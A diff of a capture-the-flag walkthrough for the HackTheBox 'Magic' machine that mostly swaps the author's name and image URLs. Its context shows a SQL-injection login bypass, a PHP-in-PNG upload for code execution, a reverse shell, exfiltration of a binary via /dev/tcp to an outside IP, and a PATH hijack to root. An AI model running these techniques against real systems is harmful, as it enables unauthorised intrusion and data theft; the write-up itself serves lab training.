@@ -9,6 +9,7 @@ avatar: assets/htb/magic.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Magic
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/Magic
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kali:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap <YOUR_IP>
+kac0@kali:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 15:28 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.050s latency).
@@ -38,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 822.01 seconds
 
 Only two ports open - 22 SSH and 80 HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-magic-site.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-magic-site.png)
 
 ### Nikto Scan
 
@@ -75,7 +76,7 @@ Finished nikto scan
 
 While testing various things, I found multiple ways forward for this next section.   First, I found the URL to an upload page at `/upload.php` with dirbuster, and I also noticed you can find the URL to the upload page in the home page's source.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1.5-image-upload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.5-image-upload.png)
 
 ### HTTP Verb Tampering
 
@@ -87,15 +88,15 @@ DEBUG HTTP verb may show server debugging information.
 
 According to a post on the SANS website [https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/), a vulnerability called HTTP Verb tampering can be used to enumerate the source of pages that are supposed to be behind access control methods.  This can be done by sending HTTP methods the server does not understand and is caused by a misconfiguration of the server.
 
-![DEBUG HTTP Method](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-debug-method.png)
+![DEBUG HTTP Method](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-debug-method.png)
 
 First I requested the `/upload.php` page normally, then captured the request in Burp and sent it to the Repeater tool.  The normal request tried to redirect me to the login page.  From here I changed the HTTP method to DEBUG to see what it would give me.
 
-![&quot;TEST&quot; HTTP Method](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3.5-test-method.png)
+![&quot;TEST&quot; HTTP Method](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3.5-test-method.png)
 
 Using the method DEBUG I was given the source of the `/upload.php` page!  This can also be done against this server by sending arbitrary method names as such `TEST`:
 
-![&quot;TEST&quot; HTTP Method](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3.5-test-method.png)
+![&quot;TEST&quot; HTTP Method](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3.5-test-method.png)
 
 {% hint style="info" %}
 There is a link to login at the bottom left of the home page which leads to the standard admin login page. While checking for for simple SQL injection I put my test command **`'or'a'='a`** in the password field and was logged right in! 
@@ -103,7 +104,7 @@ There is a link to login at the bottom left of the home page which leads to the 
 
 Whatever method used, it leads to the upload page where there is a simple drag & drop file uploader: 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-magic-upload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-magic-upload.png)
 
 After getting access to the upload page, I crafted an fake image upload with a PNG file header and PHP code in it and send it using Burp Repeater. I got this idea a while back from watching Ippsec's videos on [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s).
 
@@ -144,13 +145,13 @@ Upload Image
 _This text may not work by directly copying and pasting. The PNG file header has some other bytes in it that do not render as ASCII and do not copy properly, but Burp is capable of grabbing them if you capture a file upload/download. I sent a test PNG first, then cut out everything but the headers to craft my payload._
 {% endhint %}
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5.5-image-upload_success.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5.5-image-upload_success.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-image-upload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-image-upload.png)
 
 `whoami` returns `www-data` 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-whoami.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-whoami.png)
 
 `pwd` gets me `/var/www/Magic/images/uploads`
 
@@ -168,10 +169,10 @@ sending a non-image file results in this message: `<script>alert('What are you t
 
 to get burp to catch the request I had to go into the settings and disable the default filter that tells it not to intercept image requests
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-disable-image-filter.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-disable-image-filter.png)
 
 ```python
-zweilos@kali:~/Downloads$ nc -lvnp 8099
+kac0@kali:~/Downloads$ nc -lvnp 8099
 listening on [any] 8099 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 48146
 /bin/sh: 0: can't access tty; job control turned off
@@ -182,8 +183,8 @@ $ python -c "import pty;pty.spawn('/bin/bash');"
 $ python3 -c "import pty;pty.spawn('/bin/bash');"
 www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
 [1]+  Stopped                 nc -lvnp 8099
-zweilos@kalimaa:~/Downloads$ stty raw -echo
-zweilos@kalimaa:~/Downloads$ nc -lvnp 8099
+kac0@kalimaa:~/Downloads$ stty raw -echo
+kac0@kalimaa:~/Downloads$ nc -lvnp 8099
 
 www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm-256color
 www-data@ubuntu:/var/www/Magic/images/uploads$
@@ -442,7 +443,7 @@ theseus@ubuntu:~$ ls
 Desktop    Downloads  Pictures  Templates  Videos
 Documents  Music      Public    user.txt
 theseus@ubuntu:~$ cat user.txt
-123d****f87d
+123d************************f87d
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -601,7 +602,7 @@ hint: you can use the Bing in-search calculator to convert between the two measu
 
 I decided to exfiltrate the `sysinfo` program see how it worked. `theseus@ubuntu:/dev/shm$ cat /bin/sysinfo > /dev/tcp/10.10.15.57/8099`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-free-ghidra.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-free-ghidra.png)
 
 By examining the program sysinfo in `ghidra` I could see that it called multiple other programs, similar to a bash script. The problem with this program was that it called these external programs only by name, and did not use the full absolute paths. This can allow a malicious attacker \(or even a friendly neighborhood security researcher!\) to create their own program in a folder that exists in the PATH earlier than the real one \(or one could simply prepend a folder of their choosing to the PATH environment variable!\)
 
@@ -620,5 +621,5 @@ I also had to make sure to make the file was executable by root \(`+x` makes it 
 ```text
 root@ubuntu:/root# cat root.txt
 cat root.txt
-80e2****0f37
+80e2************************0f37
 ```
